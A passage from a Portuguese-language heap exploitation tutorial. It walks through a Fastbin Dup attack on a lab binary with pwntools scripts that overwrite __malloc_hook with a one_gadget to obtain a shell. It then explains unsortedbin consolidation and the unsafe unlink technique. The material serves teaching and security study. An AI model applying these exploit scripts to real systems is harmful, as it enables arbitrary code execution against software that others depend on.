<p>Com este conhecimento, podemos modificar nosso script. A primeira coisa que é preciso editar, é o alinhamento do <em>chunk</em> falso com o <em>size field</em> <code class="language-plaintext highlighter-rouge">0x7f</code> substituindo o endereço da <code class="language-plaintext highlighter-rouge">free_hook()</code> pela <code class="language-plaintext highlighter-rouge">malloc hook</code> e subtraindo 35 bytes, pois esta é a distância entre ela e o endereço do <em>chunk</em> falso.<br />
Depois, podemos substituir todas as requisições de <em>chunks</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, para <em>chunks</em> de <code class="language-plaintext highlighter-rouge">0x70</code> bytes, isso para que nosso <em>size field</em> possa ser comparado com a <em>fastbin</em>, sem que haja nenhum erro durante a checagem.<br />
Por ultimo, precisamos adicionar 19 bytes de “lixo” no início dos dados que vamos escrever no <em>chunk</em> falso, porque o primeiro <em>quadword</em> do <em>user data</em> não estará mais alinhado com a <code class="language-plaintext highlighter-rouge">malloc hook</code>.</p>

<p>O bloco de exploração ficou desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para o "malloc hook"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">lib</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mi">35</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "malloc hook"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "malloc hook"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">19</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Após esta alteração, podemos executar o script com as opções do GDB.<br />
A primeira coisa a se observer, é que desta vez o GDB não abortou a execução. Se pausarmos o GDB e fizermos o <em>disassembly</em> da <code class="language-plaintext highlighter-rouge">malloc hook</code> com o comando <code class="language-plaintext highlighter-rouge">u</code>, podemos ver que ela agora aponta para a função <code class="language-plaintext highlighter-rouge">system()</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_137.png" alt="Malloc hook apontando para system()" /></p>

<p>Em vias normais, o que é preciso fazer agora, é chamar a função <code class="language-plaintext highlighter-rouge">malloc()</code> novamente, com o endereço da <em>string</em> que contém o comando a ser executado como primeiro argumento, assim como fizemos na técnica <code class="language-plaintext highlighter-rouge">The house of Force</code>.</p>

<p>No entando, se continuarmos a execução e tentarmos inserir um endereço que seja maior que 120 bytes, o que não é nem próximo de um endereço válido dentro do binário, o programa não nos deixa completar a requisição, conforme ilustradao abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_138.png" alt="Programa bloqueia endereços altos" /></p>

<p>Neste ponto, já foi possível redirecionar o fluxo do programa uma vez e pelo menos metade da exploração está concluída, restando somente redirecionar o fluxo mais uma vez. No entanto, o próprio programa bloqueia a continuidade devido a limitação do <em>size field</em>.</p>

<p>Porém, existe uma forma de conseguir um <code class="language-plaintext highlighter-rouge">shell</code> alterando o fluxo do programa apenas uma vez utilizando o <code class="language-plaintext highlighter-rouge">one gadgets</code>.</p>

<h3 id="one-gadgets">One gadgets</h3>

<p>Se consultarmos a <em>man page</em> da função <code class="language-plaintext highlighter-rouge">system()</code>, podemos ver que ela utiliza a função <code class="language-plaintext highlighter-rouge">execl()</code> para executar o “/bin/sh” com a opção “-c” seguido pelo comando passado como argumento, que por sua vez utiliza <code class="language-plaintext highlighter-rouge">execve()</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_139.png" alt="Man page system()" /></p>

<p>Isso significa que dentro da GLIBC existe algum código equivalente ao <code class="language-plaintext highlighter-rouge">execve("/bin/bash")</code> que nos dará uma <code class="language-plaintext highlighter-rouge">shell</code>.<br />
E estes trechos de código que encapsulam funções, são chamados de <code class="language-plaintext highlighter-rouge">one gadgets</code>.</p>

<p>Podemos procurar por <em>gadgets</em> manualmente, porém a ferramenta “onde_gadget” (encontrada em <a href="https://github.com/david942j/one_gadget">github.com/david942j/one_gadget</a>), nos permite fazer a busca automatizada.</p>

<blockquote>
  <p>A sintaxe é <code class="language-plaintext highlighter-rouge">one_gadget &lt;caminho para a GLIBC do binário&gt;</code></p>
</blockquote>

<p>Normalmente o caminho para a GLIBC é constante nos binários do sistema, porém como este binário foi compilado com uma versão específica da GLIBC, precisamos inserir seu <em>path</em> no comando, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_140.png" alt="one_gadget" /></p>

<p>Conforme podemos observar o one_gadget nos mostra o <em>offset</em> (distância entre o endereço inicial da GLIBC até o endereço da chamada) de cada chamada, seguido das <em>constraints</em>, ou condições que precisam ser atendidas para a chamada ser válida.</p>

<p>Por exemplo: o terceiro gadget, se inicia <code class="language-plaintext highlighter-rouge">0xe1fa1</code> bytes depois do endereço inicial da GLIBC e a condição para que a chamada seja válida, é de que o RSP (<em>Stack pointer</em>) + <code class="language-plaintext highlighter-rouge">0x50</code> esteja nulo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_141.png" alt="Condições do gadget" /></p>

<p>Isto corre, pois neste <em>gadget</em> em particular, a <em>array</em> de argumendos da chamada para <code class="language-plaintext highlighter-rouge">execve()</code> se inicia na <em>stack pointer</em> + <code class="language-plaintext highlighter-rouge">0x50</code>.</p>

<p>Na maioria dos sistemas o “/bin/sh” é um link simbólico para o <code class="language-plaintext highlighter-rouge">dash</code>. Podemos confirmar, consultando <code class="language-plaintext highlighter-rouge">man sh</code>, que nos abrirá o manual do dash.</p>

<blockquote>
  <p>O <em>dash</em> é muito sensível a argumentos mal formados, incluindo endereços ilegíveis, opções inexistentes e <em>paths</em> inexistentes e falhará se for chamado com qualquer uma destas inconsistências.<br />
E é por isso que é preciso se certificar que a primeira entrada na <em>array</em> de argumentos seja nula, pois isso garante que ele não tente processar qualquer argumento falho em potencial.</p>
</blockquote>

<p>Vamos verificar se conseguimos atender alguma das condições mostradas pelo one_gadget no momento em que fazemos a chamada. Para isso, vamos executar o script novamente com as opções do GDB, pausar a execução e inserir um <em>breakpoint</em> em <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_142.png" alt="Breakpoint na __malloc_hook" /></p>

<p>Agora podemos continuar o programa, alterar para o terminal de execução do script e requisitar um <em>chunk</em> válido com os tamanhos entre 1 e 120 bytes.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_143.png" alt="Solicitando um chunk válido" /></p>

<p>Voltando ao GDB, vemos que ele parou em nosso <em>brakpoint</em>, utilizando o comando <code class="language-plaintext highlighter-rouge">context reg</code>, podemos focalizar os registradores no exato momento em que chamamos a <code class="language-plaintext highlighter-rouge">malloc()</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_144.png" alt="Registradores no breakpoint" /></p>

<p>Analisando os registradores e comparando com as condições que o one_gadget nescessita, podemos ver que a primeira condição que dizia que os registradores <code class="language-plaintext highlighter-rouge">R12</code> e <code class="language-plaintext highlighter-rouge">R13</code> precisariam estar nulos, não é atendida, pois neste ponto eles estão em uso.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_145.png" alt="Registradores em uso" /></p>

<p>A segunda opção, nos dizia que os registradores <code class="language-plaintext highlighter-rouge">RBP - 0x40</code> e <code class="language-plaintext highlighter-rouge">R12</code> precisam estar nulos. O que também não é atendido, pois neste ponto, o <code class="language-plaintext highlighter-rouge">R12</code> está em uso.</p>

<p>Já a terceira opção, nos dizia que o registrador <code class="language-plaintext highlighter-rouge">RSP + 0x50</code>, deve estar nulo. Podemos checar a <em>stack</em> com o comando <code class="language-plaintext highlighter-rouge">stack</code> seguido da quantidade de <em>quadwords</em> que queremos mostrar, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_146.png" alt="Consultando a stack" /></p>

<p>Como podemos ver, este endereço também não é nulo, porém é um endereço válido.<br />
De acordo com a <em>C11 standard states</em> (que pode ser consultada em <a href="https://port70.net/~nsz/c/c11/n1570.html">port70.net/~nsz/c/c11/n1570.html</a>), a primeira entrada em toda <em>argv array</em>, normalmente representa o nome do programa sendo invocado, e que na maior parte dos casos, é ignorada.</p>

<p>Já a próxima entrada, é nula, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_147.png" alt="Próxima entrada nula" /></p>

<p>E uma vez que a chamada principal será ignorada e partirá para a próxima, as condições do one_gadget serão atendidas, mesmo que o próprio one_gadget tenha mostrado o endereço anterior.</p>

<p>Para testarmos esta teoria, vamos editar o bloco de exploração do script e substituir o endereço da função <code class="language-plaintext highlighter-rouge">system()</code> pelo endereço da GLIBC mais o <em>offset</em> do terceiro gadget sugerido pelo one_gadget, e adicionar mais uma chamada de malloc para ativarmos o gadget.</p>

<p>O bloco fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para o "malloc hook"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mi">35</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "malloc hook"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "malloc hook"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">19</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xe1fa1</span><span class="p">))</span>

<span class="c1"># ativando o gadget
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora podemos executar o script, em condições de produção, sem atrelá-lo ao GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_148.png" alt="Shell obtido" /></p>

<p>E como podemos observer, conseguimos invocar um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<blockquote>
  <p>Em resumo, abusamos da vulnerabilidade de <em>double free</em> para invocarmos a técnica <code class="language-plaintext highlighter-rouge">Fastbin Dup</code>, do qual utilizamos para fazer um link com um <em>chunk</em> falso sobrescrevendo a <code class="language-plaintext highlighter-rouge">malloc hook</code> na <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x70</code> bytes.<br />
Conseguimos alocar este <em>chunk</em> falso utilizando metadados da própria GLIBC como <em>size field</em>. E como a malloc não checa o alinhamento do endereço, muito menos as <em>flags</em>, não houve problemas em alocar este <em>chunk</em>.<br />
Então escrevemos o endereço do <em>gadget</em> que chama o <code class="language-plaintext highlighter-rouge">shell</code> sobre a <code class="language-plaintext highlighter-rouge">malloc hook</code>.<br />
E finalmente ativamos a <code class="language-plaintext highlighter-rouge">malloc()</code> que foi redirecionada via <code class="language-plaintext highlighter-rouge">malloc hook</code> para o <em>gadget</em> nos dando um <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<p>A <code class="language-plaintext highlighter-rouge">Fastbin Dup</code> pode ser utilizada nas GLIBCs de versão menor ou igual a <code class="language-plaintext highlighter-rouge">2.31</code>.</p>

<h1 id="unlinking-attack">Unlinking Attack</h1>

<p>Esta é provavelmente uma das técnicas mais complexas da exploração da <em>heap</em>, da qual exigirá um conhecimento um pouco mais profundo da estrutura de uma <code class="language-plaintext highlighter-rouge">arena</code>. Para tanto, antes de iniciarmos a exploração, vamos nos aprofundar nesta estrutura.</p>

<h2 id="unlinking">Unlinking</h2>

<p>Até o momento vimos apenas o que acontece com <em>chunks</em> pequenos o suficiente para se qualificar para os <em>fastbins</em> quando são liberados, ou seja, <em>chunks</em> com tamanho entre <code class="language-plaintext highlighter-rouge">0x20</code> e <code class="language-plaintext highlighter-rouge">0x80</code> bytes.</p>

<p>Porém, existem <em>bins</em> de diversos tamanhos, que são chamados de <em>unsortedbins</em>. Estes <em>chunks</em>, além da diferença no tamanho, também possuem um conceito de “consolidação” de <em>chunks</em>.</p>

<p>No diretório <code class="language-plaintext highlighter-rouge">unsafe_unlink</code>, vamos carregar no GDB o binário <code class="language-plaintext highlighter-rouge">demo</code>. Também vamos alterar o contexto do painel para o código com o comando <code class="language-plaintext highlighter-rouge">set context-sections code</code>, inserir um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">main()</code> com o comando <code class="language-plaintext highlighter-rouge">b main</code> e executar o programa.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_162.png" alt="Carregando o programa no GDB" /></p>

<p>Observando o código, já sabemos como as requisições para a malloc funcionam, então podemos utilizar o comando <code class="language-plaintext highlighter-rouge">next 2</code> e inspecionar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_163.png" alt="Requisitando os chunks" /></p>

<p>Como podemos ver, temos os dois <em>chunks</em>, <em>chunk</em> a e <em>chunk</em> b, com o tamanho de <code class="language-plaintext highlighter-rouge">0x90</code> bytes cada criados na <em>heap</em>. Antes, quando liberavamos <em>chunks</em> apropriados para os <em>fastbins</em>, eles não tinham nenhum efeito perceptível nos <em>chunks</em> ao redor, nem alteravam seu comportamento por estarem próximos ao <em>top chunk</em> quando eram liberados. Porém, estamos lidando com <em>chunks</em> que não se qualificam para os <em>fastbins</em>, por serem maiores que <code class="language-plaintext highlighter-rouge">0x80</code> bytes.</p>

<p>Vamos avançar um passo na execução, que vai liberar o <em>chunk</em> b, que além de não estar na <em>fastbin</em>, está adjacente ao <em>top chunk</em> e checar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_164.png" alt="Liberando o chunk b" /></p>

<p>Diferente dos <em>chunks</em> pertencentes aos <em>fastbins</em>, este <em>chunk</em> desapareceu. Pois <em>chunks</em> grandes demais para se qualificarem aos <em>fastbins</em> e que se encontram adjacentes ao <em>top chunk</em>, aqui referenciados como <em>chunks</em> “normais”, são consolidados ao <em>top chunk</em>.<br />
Se tentarmos visualizar os <em>bins</em> com o comando <code class="language-plaintext highlighter-rouge">bins</code>, veremos que o <em>chunk</em> liberado não pertence a nenhuma lista.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_165.png" alt="O chunk b, não pertence a nenhuma lista" /></p>

<p>Se avançarmos mais dois passos na execução, o <em>chunk</em> b será requisitado novamente, seguido de uma requisição de <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes. Porém, vamos retornar ao <em>chunk</em> b em alguns momentos, enquanto isso, vamos ver o que acontece quando liberamos um <em>chunk</em> normal que não é adjacente ao <em>top chunk</em>. Avançando mais um passo, vamos liberar o <em>chunk</em> a com o comando <code class="language-plaintext highlighter-rouge">next</code> e inspecionar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_166.png" alt="Liberando o chunk a" /></p>

<p>Podemos observar que três mudanças aconteceram na <em>heap</em>. A primeira, é que o <em>bit</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do chunk seguinte foi retirado, algo que não acontece quando liberamos <em>chunks</em> qualificados para os <em>fastbins</em>, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_167.png" alt="Bit prev_inuse retirado" /></p>

<p>Em breve, veremos a importância desta informação. A segunda mudança, é que o ultimo <em>quadword</em> do <em>user data</em> do <em>chunk</em> a, foi reaproveitado como um <code class="language-plaintext highlighter-rouge">prev_size field</code>, que como podemos ver, contém seu próprio tamano, outra coisa que não acontece quando estamos lidando com <em>fastbins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_168.png" alt="Campo prev_size adicionado" /></p>

<p>Observe como o <em>quadword</em> que contém o <code class="language-plaintext highlighter-rouge">prev_size field</code> agora tem outra cor no PWNDBG, indicando que pertence ao <em>chunk</em> b ao invés do <em>chunk</em> a, este é um exemplo claro de como os <em>chunks</em> podem mudar sua forma durante seu tempo de vida. Por ultimo, vemos que o <em>chunk</em> a, foi inserido no <em>unsortedbin</em>, podemos confirmar isto com o comando <code class="language-plaintext highlighter-rouge">unsortedbin</code> conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_169.png" alt="Chunk a inserido no unsortedbin" /></p>

<p>A <em>unsortedbin</em> é uma outra lista de <em>chunks</em> livres na malloc. Diferente dos <em>fastbins</em>, existe apenas um <em>unsortedbin</em> por arena. Ela é uma lista “duplamente ligada”, circular e que armazena <em>chunks</em> livres de <strong>qualquer</strong> tamanho.</p>

<p>Por conta de ser duplamente ligada, ela utiliza ambos os <em>forward</em> e <em>backward pointers</em>, ou “fd” e “bk” respectivamente. E podemos ver que os dois primeiros <em>quadwords</em> do <em>user data</em> do <em>chunk</em> a, foram reaproveitados como “fd” e “bk” na <em>unsortedbin</em>, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_170.png" alt="Fd e bk da unsortedbin" /></p>

<p>O topo da uma <em>unsortedbin</em> existe em uma <em>main arena</em>, assim como os <em>fastbins</em>, que um par de <em>forward</em> e <em>backward pointers</em> que a malloc trata como se fosse parte de um <em>chunk</em> falso, que se encontram dois <em>quadwords</em> depois do <em>top chunk pointer</em>. Podemos visualizá-lo na <code class="language-plaintext highlighter-rouge">main arena</code>, requisitando os 16 primeiros quadwords com o comando <code class="language-plaintext highlighter-rouge">dq</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_171.png" alt="Estrutura da main arena" /></p>

<p>Neste momento, ambos “fd” e “bk” na <code class="language-plaintext highlighter-rouge">main arena</code> apontam para o <em>chunk</em> a, que é o único <em>chunk</em> neste <em>unsortedbin</em>, circulados em vermelho. As “fd” e “bk” do <em>chunk</em> a apontam para o <em>chunk</em> do <em>unsortedbin</em>, curculados de azul que se inicia no <em>top chunk</em> circulado de verde.</p>

<p>A malloc trada o topo do <em>unsortedbin</em> como um <em>chunk</em> falso desta forma, exatamente para evitar ter que tratá-lo de forma especial.</p>

<p>A imagem abaixo exemplifica de forma abstrata a estrutura do <em>unsortedbin</em>, onde o <em>Head</em> representa o topo do <em>ubnsortedbin</em> na <code class="language-plaintext highlighter-rouge">main arena</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_172.png" alt="Representação da estrutura de um chunk" /></p>

<p>Nesta estrutura, cada “fd” forma uma lista circular com o “fd” do <em>unsortedbin</em> apontando para o primeiro <em>chunk</em> no <em>bin</em> e o “fd” deste chunk aponta para o próximo respectivamente, e a “fd” do último <em>chunk</em> aponta de volta para a “fd” do <em>unsortedbin</em>, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_173.png" alt="Direcionamento dos fds" /></p>

<p>Da mesma forma, a “bk” do último <em>chunk</em> no <em>bin</em> aponta para a “fd” do chunk anterior sucessivamente e a “bk” da <em>unsortedbin</em> aponta para o útimo <em>chunk</em>, completando um circulo, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_174.png" alt="Direcionamento dos bks" /></p>

<p>Assim como nos <em>fastbins</em>, o endereço dos novos <em>chunks</em> liberados são adicionados no topo da <em>unsortedbin</em>, porém, diferente dos <em>fastbins</em>, novos <em>chunks</em> são adicionados no final da <em>unsortedbin</em>.</p>

<p>Reanalisando a imagem abaixo, vemos que liberar um <em>fast chunk</em> (<em>chunks</em> qualificados para o <em>fastbin</em>) não afeta os <em>chunks</em> ao redor, porém ele fez com que o <em>chunk</em> b não seja mais adjacente ao <em>top chunk</em>, o que o impede de ser consolidado ao <em>top chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_175.png" alt="Estado atual da heap" /></p>

<p>Porém, ele é adjacente ao <em>chunk</em> a, que neste momento está livre. O próximo passo na execução do programa, é justamente liberar o <em>chunk</em> b novamente, podemos liberá-lo com o comando <code class="language-plaintext highlighter-rouge">next</code> e depois inspecionar a <em>heap</em> e o <em>unsortedbin</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_176.png" alt="Avançando a execução" /></p>

<p>Desta vez, os <em>chunks</em> a e b, foram consolidados em um mesmo <em>chunk</em> maior, seu <em>size field</em> agora corresponde a um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x120</code> bytes de tamanho, a soma de dois <em>chunks</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes.</p>

<p>Também podemos ver que a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes foi retirada e adotou um <code class="language-plaintext highlighter-rouge">prev_size field</code> indicando que o <em>chunk</em> anterior tem o tamanho de <code class="language-plaintext highlighter-rouge">0x120</code> bytes.<br />
Também podemos ver na saída do comando <code class="language-plaintext highlighter-rouge">unsortedbin</code> que ainda existe somente um <em>chunk</em> no <em>unsortedbin</em>, este <em>chunk</em> maior.</p>

<blockquote>
  <p>Portanto, <em>chunks</em> livres adjacentes também são consolidados.<br />
Este processo pode parecer simples, mas vamos considerar o que a malloc precisa fazer para conseguir este resultado:</p>
  <ol>
    <li>Quando liberamos um <em>chunk</em>, a malloc precisa checar se qualquer <em>chunk</em> adjacente está disponível para consolidação. Ela faz isso utilizando a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>.</li>
    <li>A malloc checa a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do <em>chunk</em> que está sendo liberado para verificar se o <em>chunk</em> anterior também está livre.</li>
    <li>E para checar se o próximo <em>chunk</em> está livre, a malloc precisa olhar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> de dois <em>chunks</em> seguintes para verificar se o <em>chunk</em> anterior a ele (o seguinte ao <em>chunk</em> ao que está sendo liberado) está livre.</li>
    <li>Uma vez que a malloc tenha estabelecido se o <em>chunk</em> anterior ou posterior, ou ambos sejam candidados à consolidação, ela precisa removê-los de qualquer lista que eles possam estar ligados, de outra forma, um <em>chunk</em> pode ser ligado em duas listas diferentes ao mesmo tempo.</li>
    <li>Então, a malloc precisa incrementar o espaço total ocupado pelo novo <em>chunk</em> maior e configurar o <em>size field</em> e o <code class="language-plaintext highlighter-rouge">prev_size field</code> de acordo com o resultado.</li>
    <li>Por fim, o novo <em>chunk</em> consolidado é ligado ao <em>unsortedbin</em>.</li>
  </ol>
</blockquote>

<p>O que mais nos interessa no processo de consolidação dos <em>chunks</em>, é a parte do <em>unlinking</em>, onde os <em>chunks</em> que estão sendo consolidados, são removidos de uma lista.</p>

<p>Um dos benefícios das listas duplamente ligadas, é a habilidade de remover facilmente um item do meio desta lista.</p>

<p>Se quisermos remover um item de uma lista simples, como a <em>fastbin</em>, precisamos iterar sobre esta lista eté encontrar o item precedente ao que desejamos remover, então, modificar seu “fd” para remover este item. Exemplo:</p>

<blockquote>
  <p>Se quisermos remover o item número 500 da uma lista <em>fastbin</em>, precisamos checar o “fd” dos 499 itens antes de encontrar o que precede o <em>chunk</em> que queremos remover.<br />
No entanto, na consolidação de <em>chunks</em> normais, a malloc pode facilmente remover um <em>chunk</em> do meio de uma lista, mesmo que esta seja imensa.</p>
</blockquote>

<p>Este processo será ilustrado de forma abstrata abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_177.png" alt="Processo de unlinking" /></p>

<p>Nesta situação, vamos imaginar que queremos remover o <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> da <em>unsortedbin</em>. A primeira ação da malloc, é seguir a “fd” do <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> para encontrar o próximo <em>chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_178.png" alt="Seguindo o fd do chunk Victim" /></p>

<p>Ao encontrar o próximo <em>chunk</em>, a malloc sobrescreve seu “bk” com o mesmo valor do “bk” do <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code>, fazendo com que ele aponte para o <em>chunk</em> anterior ao <code class="language-plaintext highlighter-rouge">Victim</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_179.png" alt="Sobrescrevendo bk do chunk seguinte ao Victim" /></p>

<p>Neste momento, o <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> já foi desvinculado da lista <em>backward</em>. Depois disso, a malloc segue o “bk” do <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> para encontrar o <em>chunk</em> que o precede na lista.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_180.png" alt="Seguindo o bk do chunk Victim" /></p>

<p>Ao encontrar o <em>chunk</em> anterior, a malloc sobrescreve seu “fd” com o “fd” do <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code>, fazendo com que ele aponte para o <em>chunk</em> posterior ao <code class="language-plaintext highlighter-rouge">Victim</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_181.png" alt="Sobrescrevendo fd do chunk anterior ao Victim" /></p>

<p>Neste momento, o <em>chunk</em> <code class="language-plaintext highlighter-rouge">Victim</code> foi desvinculado de ambas as listas, <em>backward</em> e <em>forward</em>.</p>

<p>Em versões mais antigas da GLIBC, este processo de desvinculação é feito através de uma <code class="language-plaintext highlighter-rouge">macro</code>, sem nenhum tipo de verificação de integridade dos <em>pointers</em> “fd” e “bk”, sendo conhecido como <em>unsafe unlink</em>.</p>

<p>Se um atacante encontrar uma maneira de adulterar o “fd” e “bk” de um <em>chunk</em> que está sendo desvinculado, consequentemente ele conseguirá uma “escrita refletida”, fazendo com que este atacante possa selecionar dois endereços e escrevê-los um próximo ao outro na memória.</p>

